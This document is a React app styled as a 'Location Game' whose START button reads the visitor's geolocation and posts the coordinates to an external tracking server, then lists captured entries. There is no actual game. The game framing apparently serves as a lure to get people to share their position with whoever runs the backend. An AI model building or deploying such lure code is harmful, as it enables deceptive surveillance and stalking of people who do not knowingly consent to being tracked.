import { useState } from "react";

function App() {
  const [status, setStatus] = useState("🎮 Press START to play");
  const [history, setHistory] = useState([]);

  const startGame = () => {
    if (!navigator.geolocation) {
      setStatus("❌ Not supported");
      return;
    }

    setStatus("📡 Detecting location...");

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        try {
          // ✅ Send to backend
          await fetch("https://location-tracker-km22.onrender.com/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ lat, lng }),
          });

          setStatus("🏆 Location captured!");

          // ✅ Fetch history (IST)
          const res = await fetch("https://location-tracker-km22.onrender.com/locations");
          const data = await res.json();
          setHistory(data);

        } catch (err) {
          setStatus("❌ Error sending data");
        }
      },
      () => {
        setStatus("❌ Permission denied");
      }
    );
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>🎮 Location Game</h1>

      <button style={styles.button} onClick={startGame}>
        ▶ START GAME
      </button>

      <p style={styles.status}>{status}</p>

      {/* ✅ HISTORY */}
      <div style={styles.history}>
        <h2>📜 History (IST)</h2>

        {history.map((item, index) => (
          <div key={index} style={styles.card}>
            🕒 {item.time}
          </div>
        ))}
      </div>
    </div>
  );
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "#0f172a",
    color: "#fff",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    paddingTop: "50px",
  },
  title: {
    fontSize: "40px",
    marginBottom: "20px",
  },
  button: {
    padding: "15px 30px",
    fontSize: "18px",
    background: "#22c55e",
    border: "none",
    borderRadius: "10px",
    cursor: "pointer",
  },
  status: {
    marginTop: "20px",
    fontSize: "18px",
  },
  history: {
    marginTop: "40px",
    width: "80%",
  },
  card: {
    background: "#1e293b",
    padding: "10px",
    margin: "10px 0",
    borderRadius: "8px",
  },
};

export default App;